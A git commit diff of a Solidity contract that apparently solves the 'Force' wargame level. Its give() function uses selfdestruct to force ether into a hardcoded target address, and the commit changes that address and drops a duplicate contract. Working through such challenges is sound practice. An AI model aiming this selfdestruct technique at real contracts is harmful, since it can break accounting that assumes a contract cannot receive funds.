2d3198c46f5bb18794bcb1bcb8dd084ae6370f6e
zhou <1036767219@qq.com>
2023-03-09 18:32:57 +0800

    update Force

--- 08_Force.sol
+++ 08_Force.sol
@@ -2,18 +2,12 @@ pragma solidity ^0.4.18;
  
 
 contract Force {
-    Force target = Force(0x580391b74a393A54ccbA42c8f2aF3f1B4aEcE0Ee);
+    Force target = Force(0x711f4634bCeA47fB09703331e3AEb1ae7DAA75CA);
+
+    function hack() payable {}
 
     function give() public payable {
         selfdestruct(target);
     }
 }
 
-contract Force {
-    constructor() payable {// 使用非0的value部署合约
-
-    }
-    function destruct(address payable addr) public  {
-        selfdestruct(addr);
-    }
-}
